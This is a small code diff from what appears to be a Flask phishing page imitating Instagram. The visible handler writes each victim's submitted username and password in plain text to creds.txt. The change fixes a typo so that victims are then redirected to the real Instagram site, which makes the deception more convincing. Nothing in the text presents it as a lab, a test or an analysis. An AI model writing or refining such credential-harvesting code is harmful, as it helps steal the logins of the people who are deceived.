@@ -11,7 +11,7 @@ def submit():
                           
     with open("creds.txt", 'a') as f:
         f.write(f"username : {username}, password : {password}/n")
-    return redirect("http://insatagram.com")
+    return redirect("http://instagram.com")
 
 if __name__ == "__main__":
     app.run(debug=True)
